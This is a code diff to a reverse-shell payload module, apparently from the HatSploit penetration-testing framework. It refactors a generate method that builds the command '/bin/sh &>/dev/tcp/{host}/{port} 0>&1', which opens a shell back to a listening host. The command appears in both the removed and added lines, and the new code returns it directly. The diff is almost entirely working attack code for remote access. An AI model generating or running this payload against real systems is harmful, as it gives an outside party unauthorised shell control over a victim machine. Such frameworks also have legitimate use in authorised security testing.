@@ -54,8 +54,11 @@ class HatSploitPayload(HatSploitPayload):
     def generate(self):
         local_host, local_port = self.parser.parse_options(self.options)
 
-        self.data['payload'] = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
-        self.data['execute'] = self.data['payload']
-        self.data['type'] = 'reverse_tcp'
+        self.badges.output_process("Generating payload...")
+        payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
 
-        return self.data
+        self.method['Payload'] = payload
+        self.method['Insructions'] = payload
+        self.method['Action'] = 'reverse_tcp'
+
+        return payload
